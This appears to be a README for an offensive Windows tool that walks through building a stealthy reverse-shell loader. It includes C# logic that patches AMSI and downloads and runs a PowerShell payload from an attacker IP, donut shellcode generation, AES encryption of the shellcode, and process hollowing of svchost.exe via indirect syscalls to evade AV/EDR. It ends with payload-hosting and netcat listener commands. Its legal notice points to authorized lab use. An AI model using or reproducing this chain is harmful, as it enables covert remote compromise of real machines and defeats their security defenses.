# Stealth-Shellcode-Runner

# 🔒 Advanced Shellcode Execution via Process Hollowing and AES Encryption

This project demonstrates a stealthy approach to executing an AES-encrypted PowerShell reverse shell using a custom C# loader, `donut` for shellcode generation, and a custom runner using **full indirect syscalls** and **process hollowing** techniques.

---

## 🧩 Step 1 - Build the PowerShell Loader (`Project_Stealth.cs`)

Create a minimal C# console project and include the following logic to:

- Patch AMSI via `.NET Reflection`
- Download and execute a PowerShell payload (e.g., reverse shell)
- Use base64 obfuscation for script names

📌 **Note:** You must manually add a reference to:
```
C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
```

### Core logic:
```csharp
string attackerIP = "192.168.1.94";
PatchAMSI();
string psUrl = $"http://{attackerIP}/shell.ps1";
string psScript = GetStringFromUrl(psUrl);
ExecutePowerShell(psScript);
```

---

## 🧪 Step 2 - Generate Shellcode with Donut

Use [Donut](https://github.com/TheWover/donut) to convert the compiled loader into shellcode:

```bash
.\donut.exe -i "Project_Stealth.exe" -a 2 -f 1 -o shellcode.bin
```

- `-a 2`: Target .NET assemblies
- `-f 1`: Run the .NET assembly as unmanaged shellcode

---

## 🔐 Step 3 - AES Encrypt the Shellcode

Use the provided Python script to AES-encrypt the generated shellcode. It also formats the output into C# arrays:

```bash
python3 Aes_encryption.py
```

Paste the output into the `ShellCode_Runner.cs` file:

```csharp
byte[] encryptedShellcode = new byte[] { ... };
byte[] aesKey = new byte[] { ... };
byte[] aesIV = new byte[] { ... };
```

---

## 🧠 Step 4 - Execute with Process Hollowing + Indirect Syscalls

Use the included `ShellCode_Runner.cs` script to:

- Create a suspended process (`svchost.exe`)
- Allocate RWX memory using **indirect syscall**
- Decrypt and inject the AES shellcode into the target process
- Change memory protection and launch a remote thread using **indirect syscall**

✅ All key syscalls (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`) are executed from manually copied stubs placed in memory, effectively bypassing userland hooks set by AV/EDR.

---

## 🖥️ Hosting the Reverse Shell Payload

The PowerShell reverse shell should be saved as `shell.ps1`.

Then serve the file using Python’s built-in HTTP server:

```bash
python3 -m http.server 80
```

---

## 📡 Setting Up the Listener

To catch the reverse shell, start a listener using `netcat` and `rlwrap` for a better terminal experience:

```bash
rlwrap -cAr nc -lnvp 443
```

---

## ✅ Final Outcome

- AMSI is patched silently via .NET Reflection
- PowerShell payload is downloaded and executed in memory
- Shellcode is encrypted with AES and executed via **fully indirect syscalls**
- Process is created with PPID spoofing
- Tested successfully in OSEP lab environments with Windows Defender enabled

---

**⚠️ Legal Notice:**  
This tool is intended for educational purposes and authorized penetration testing only.  
Do **not** use this code outside of lab environments or without proper authorization.
